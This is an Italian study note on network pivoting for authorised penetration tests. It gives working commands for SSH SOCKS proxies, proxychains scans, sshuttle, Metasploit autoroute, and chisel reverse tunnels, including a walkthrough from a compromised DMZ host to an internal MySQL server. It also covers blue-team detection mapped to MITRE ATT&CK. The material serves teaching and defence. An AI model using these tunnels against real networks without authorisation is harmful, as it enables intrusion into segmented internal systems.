---
tipo: concetto
tag: [metodologia, reti]
fase: 3
fonti: 5
aggiornato: 2026-06-21
stato: maturo
aliases: ["Pivoting"]
---

# Pivoting

> **Nota etica**: tecniche per pentest/lab autorizzati e con scope definito. Attraversare segmenti di rete di un cliente al di fuori del Rules of Engagement è una violazione contrattuale e potenzialmente reato. Documenta sempre i pivot stabiliti per poterli smantellare a fine test.

## In breve
Il **pivoting** è l'uso di un host già compromesso come **trampolino** (pivot) per raggiungere reti interne non instradabili dalla macchina dell'attaccante. È il prolungamento di rete del [[Lateral Movement]]: il movimento laterale dice *"quale host attacco dopo"*, il pivoting dice *"come ci arrivano i miei pacchetti"*. Si appoggia quasi sempre al [[Port Forwarding]] (tunnel SSH, chisel) e al [[Reverse Shell e Bind Shell|reverse shell]] per stabilire il canale.

## Il problema che risolve
La tua Kali sta in una rete (es. `10.10.10.0/24`, la DMZ). Compromettì un host DMZ (`10.10.10.5`) che ha **una seconda scheda** verso una rete interna (`172.16.0.0/24`) che il tuo router non conosce e non sa instradare. I servizi su `172.16.0.x` esistono ma sono **invisibili e irraggiungibili** da te.

```
   ATTACCANTE                      PIVOT (compromesso)            TARGET INTERNO
 ┌────────────┐  10.10.10.0/24  ┌──────────────────┐ 172.16.0.0/24 ┌──────────────┐
 │   Kali     │◄───────────────►│ DMZ host          │◄────────────►│ DB / DC      │
 │ 10.10.10.9 │   raggiungibile │ eth0 10.10.10.5   │  NASCOSTA    │ 172.16.0.50  │
 │            │  ─────────────► │ eth1 172.16.0.5   │ ───────────► │ :3306 / :445 │
 └────────────┘    NON instrada └──────────────────┘              └──────────────┘
       ▲                                                                  ▲
       └──────────── i tuoi pacchetti non sanno come arrivare qui ───────┘
```

Il pivot ha **visibilità** sulla rete interna (la raggiunge col suo `eth1`); tu no. Il pivoting fa sì che il pivot **inoltri** il tuo traffico.

## Le tre strategie fondamentali

### 1. Proxy SOCKS dinamico + proxychains (il cavallo di battaglia)
Apri **una sola porta SOCKS** sulla tua macchina; tutto il traffico che vi instradi esce dal pivot. Niente da pre-dichiarare: qualunque IP:porta interna è raggiungibile a runtime.

```
 Kali                                         Pivot 10.10.10.5
 ┌──────────────────────┐                     ┌─────────────────┐
 │ proxychains nmap ... │                     │                 │
 │        │             │  SSH (porta 22)     │   inoltra ──────┼──► 172.16.0.50:445
 │  SOCKS5 :1080 ◄──────┼────── tunnel ──────►│   uscendo da    │
 │        ▲             │  cifrato            │   eth1          │
 └────────┼─────────────┘                     └─────────────────┘
   ogni connessione passa qui
```

```bash
# Apri il proxy SOCKS dinamico: ascolta su 127.0.0.1:1080, esce dal pivot
ssh -D 1080 -N -f utente@10.10.10.5
#   -D 1080  porta SOCKS locale     -N  niente shell     -f  in background

# Configura proxychains: /etc/proxychains4.conf  → ultima riga
#   socks5 127.0.0.1 1080
# (usa "socks5", non "socks4": socks4 NON risolve i DNS e non supporta UDP)

# Ora QUALSIASI tool TCP attraversa il pivot
proxychains nmap -sT -Pn -p 445,3306,3389 172.16.0.50
proxychains crackmapexec smb 172.16.0.0/24
proxychains xfreerdp /v:172.16.0.50 /u:admin
```
Punti chiave operativi:
- **`-sT` obbligatorio** in proxychains: il SOCKS inoltra solo TCP "completo". Le scansioni SYN raw (`-sS`) e l'ICMP non passano → usa `-sT -Pn`. Niente UDP scan via SOCKS (è solo TCP).
- **DNS**: con `proxychains` e `proxy_dns` attivo, i nomi si risolvono dal pivot. Senza, risolvi dalla tua rete e fallisci.
- Se SSH non c'è sul pivot, lo stesso SOCKS lo dà **chisel** o **Metasploit** (vedi sotto).

### 2. Routing statico per la subnet nascosta
Invece di un proxy, dici al **kernel della tua macchina** di instradare un'intera subnet attraverso il pivot. Funziona senza proxychains, ma richiede un device tunnel (es. SSH `-w`, sshuttle, VPN).

```bash
# sshuttle: "VPN poor-man" su SSH, instrada un'intera subnet nel kernel
sshuttle -r utente@10.10.10.5 172.16.0.0/24 --dns
# Da qui in poi tutti i tool usano 172.16.0.x come se fosse locale — NIENTE proxychains
nmap -sS 172.16.0.50          # ora anche SYN scan funziona
```
sshuttle è spesso la scelta più pulita: trasparente per ogni tool, gestisce il DNS, niente `-sT`. Richiede però Python sul pivot e privilegi root locali.

### 3. autoroute / portfwd di Metasploit
Se hai una sessione [[Meterpreter]] sul pivot, [[Metasploit]] sa instradare i suoi moduli verso la rete interna **senza SSH**.

```
 msfconsole ──► sessione meterpreter su 10.10.10.5
      │
      ├─ autoroute  → aggiunge route 172.16.0.0/24 alla routing table INTERNA di MSF
      └─ socks_proxy → espone quella route come SOCKS per i tool esterni (proxychains)
```

```bash
meterpreter > run autoroute -s 172.16.0.0/24       # vecchio comando
# oppure, post-module moderno:
meterpreter > background
msf6 > use post/multi/manage/autoroute
msf6 > set SESSION 1
msf6 > set SUBNET 172.16.0.0
msf6 > run
# Ora i moduli MSF (scanner, exploit) raggiungono 172.16.0.x
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 172.16.0.50

# Per usare tool ESTERNI a MSF, esponi un SOCKS sopra l'autoroute:
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > run
# → poi proxychains come nella strategia 1

# Port forward singolo senza SOCKS (mappa una porta interna su una locale):
meterpreter > portfwd add -l 3306 -p 3306 -r 172.16.0.50
# 127.0.0.1:3306 sulla Kali → 172.16.0.50:3306 via meterpreter
```

## Tabella decisionale

| Situazione | Tecnica migliore | Perché |
|---|---|---|
| Hai SSH sul pivot, ti servono molti servizi interni | `ssh -D` + proxychains | Una porta copre tutta la subnet |
| Vuoi trasparenza totale (anche SYN scan, niente `-sT`) | sshuttle | Instrada nel kernel, no proxychains |
| Hai una sessione Meterpreter, non SSH | autoroute + socks_proxy | Resta dentro l'ecosistema MSF |
| Niente SSH, niente MSF, solo binari caricabili | [[Port Forwarding\|chisel]] reverse | Tunnella su HTTP, attraversa firewall in uscita |
| Ti serve **una sola** porta interna | `ssh -L` / `portfwd` / socat | Più leggero di un SOCKS |

## Walkthrough end-to-end: da DMZ a MySQL interno

Scenario: Kali `10.10.10.9`, pivot DMZ `10.10.10.5` (web server con RCE), target `172.16.0.50:3306` (MySQL) non raggiungibile.

```bash
# 1. Conferma il problema: il target è invisibile
nmap -p 3306 172.16.0.50
#   → "Host seems down" / nessuna risposta (il routing non esiste)

# 2. Stabilisci un canale sul pivot (qui via reverse shell dall'RCE web)
#    Sul pivot ottieni una shell; se non c'è SSH, carichi chisel.

# --- Caso A: il pivot HA SSH e tu hai credenziali ---
ssh -D 1080 -N -f operatore@10.10.10.5
# /etc/proxychains4.conf -> socks5 127.0.0.1 1080

# 3. Enumera la rete interna ATTRAVERSO il pivot
proxychains nmap -sT -Pn -p 3306 172.16.0.50
#   → 3306/tcp open  mysql        ← ora lo vedi!

# 4. Interagisci col servizio interno come se fosse locale
proxychains mysql -h 172.16.0.50 -u root -p
#   oppure mappa la porta in locale per tool che non parlano SOCKS:
ssh -L 3306:172.16.0.50:3306 -N -f operatore@10.10.10.5
mysql -h 127.0.0.1 -P 3306 -u root -p     # niente proxychains

# --- Caso B: il pivot NON ha SSH → chisel reverse ---
# Sulla Kali (server, ascolta + accetta SOCKS reverse):
chisel server -p 8080 --reverse
# Sul pivot (client, si connette in USCITA verso di te — passa i firewall):
./chisel client 10.10.10.9:8080 R:1080:socks
# Ora 127.0.0.1:1080 sulla Kali è un SOCKS verso la rete del pivot:
proxychains nmap -sT -Pn -p 3306 172.16.0.50
```

## Pivoting a più salti (multi-hop)
Reti reali hanno più strati (DMZ → app tier → DB tier). Concatena i pivot:
```
Kali ──SSH──► DMZ(10.10.10.5) ──SSH──► App(172.16.0.5) ──► DB(192.168.50.10)
```
```bash
# Catena SSH con ProxyJump (-J): un solo comando, due salti
ssh -J operatore@10.10.10.5 operatore@172.16.0.5
# SOCKS al secondo livello:
ssh -J operatore@10.10.10.5 -D 1081 -N -f operatore@172.16.0.5
# proxychains può anche concatenare proxy (dynamic_chain in proxychains4.conf)
```
Con chisel: monti un secondo chisel sul primo pivot che fa da relay verso il livello successivo. Con MSF: aggiungi una seconda `autoroute` dalla sessione sull'host del secondo livello.

## Casi limite e troubleshooting

| Sintomo | Causa probabile | Fix |
|---|---|---|
| `proxychains nmap -sS` non restituisce nulla | SOCKS inoltra solo TCP full-connect | Usa `-sT -Pn` |
| I nomi host non risolvono via proxy | `proxy_dns` off o socks4 | socks5 + `proxy_dns` attivo |
| Scan lentissimo | proxychains serializza, latenza tunnel | Riduci porte, alza timeout, evita `-A`; preferisci sshuttle |
| `ssh -D` "Address already in use" | Porta 1080 già occupata | Cambia porta (`-D 1081`) o killa il vecchio tunnel |
| chisel client non si connette | Firewall in uscita o porta filtrata | Usa porte comuni (80/443), chisel su HTTP supera molti egress filter |
| autoroute non vede la subnet | Subnet/maschera sbagliata o sessione morta | Verifica `ipconfig`/`route` sul pivot, ricontrolla la maschera |
| Il pivot reboota e perdi tutto | Tunnel non persistente | Stabilisci persistenza solo se nello scope; documenta per il cleanup |

## Detection lato blue team
Il pivoting è rumoroso se sai cosa cercare. Mappa a **MITRE ATT&CK**:
- **T1090 — Proxy** (e T1090.001 *Internal Proxy*, T1090.002 *External Proxy*): traffico inoltrato attraverso host interni.
- **T1572 — Protocol Tunneling**: tunnel SSH/chisel che incapsulano altro traffico.
- **T1571 — Non-Standard Port**: SOCKS/chisel su porte inattese.

Segnali per il [[SIEM]] / NDR:
- Un host interno che **inizia connessioni** verso molti host/porte della rete più profonda (comportamento da scanner, non da utente).
- Sessioni SSH **lunghe e in idle** con molto throughput o con `-D`/`-R` (port forwarding lato server log).
- Binari anomali (`chisel`, `socat`, `sshuttle`) eseguiti su server di produzione → EDR / `auditd`.
- Connessioni **est→ovest** che attraversano segmenti che la segmentazione doveva isolare (il pivot tradisce sé stesso: parla con reti con cui non dovrebbe).
- Egress su 443 verso un IP esterno non categorizzato con pattern non-TLS (chisel su HTTP).

Difesa: **segmentazione/microsegmentazione** rigorosa ([[Subnetting]]/VLAN, firewall interni east-west), egress filtering, all-list dei binari, monitoraggio dei flussi nord-sud ed est-ovest.

## Domande da colloquio
- *Differenza tra port forwarding e pivoting?* Il port forwarding mappa **una porta**; il pivoting usa l'host come **router/proxy** per un'intera rete. Il primo è un mattone del secondo.
- *Perché `-sT -Pn` con proxychains?* Il SOCKS inoltra solo TCP a tre vie; SYN raw e ICMP non passano, quindi niente `-sS` e niente host discovery ICMP.
- *Hai compromesso un host con due NIC ma niente SSH: come pivoti?* chisel reverse (esce in uscita, supera l'egress) o Meterpreter autoroute + socks_proxy.
- *Quando preferisci sshuttle a un SOCKS?* Quando voglio trasparenza totale (SYN scan, qualsiasi tool, DNS gestito) e ho root locale + Python sul pivot.
- *Come rileveresti pivoting in difesa?* Flussi est-ovest anomali, host interni che si comportano da scanner, tunnel SSH con `-D`/`-R`, binari come chisel/socat su server (MITRE T1090/T1572).

## Collegamenti
- [[Port Forwarding]] — i tunnel concreti che realizzano il pivot
- [[Tool di Rete in Python]] — proxy TCP e reverse tunnel SSH (Paramiko) in puro Python, quando mancano i tool sul pivot
- [[Lateral Movement]] — il pivoting è il suo prolungamento di rete
- [[Reverse Shell e Bind Shell]] — il canale iniziale sul pivot
- [[SSH]] — `-D`, `-L`, `-J` per tunnel e SOCKS
- [[Metasploit]] / [[Meterpreter]] — autoroute, socks_proxy, portfwd
- [[Nmap]] — scansione attraverso il proxy (`-sT -Pn`)
- [[Post-Exploitation]]
- [[Subnetting]] — la segmentazione che il pivoting aggira
- [[MITRE ATT&CK]]

## Fonti
- MITRE ATT&CK — Proxy (T1090): https://attack.mitre.org/techniques/T1090/
- MITRE ATT&CK — Protocol Tunneling (T1572): https://attack.mitre.org/techniques/T1572/
- HackTricks — Tunneling and Port Forwarding: https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding
- Offensive Security / proxychains-ng: https://github.com/rofl0r/proxychains-ng
- sshuttle documentation: https://sshuttle.readthedocs.io/en/stable/
